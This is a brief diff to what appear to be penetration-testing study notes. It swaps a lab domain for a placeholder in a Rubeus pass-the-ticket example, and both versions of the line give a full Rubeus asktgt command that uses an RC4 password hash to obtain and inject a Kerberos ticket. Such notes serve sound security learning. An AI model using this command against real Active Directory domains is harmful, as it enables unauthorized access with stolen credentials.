@@ -90,7 +90,7 @@ The tickets that end with $ correspond to the computer account, which needs a ti
 
 **Rubeus - Pass the Ticket**
 ````
-> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+> Rubeus.exe asktgt /domain:<domain> /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
 Note that now it displays Ticket successfully imported!.
 ````
 ````
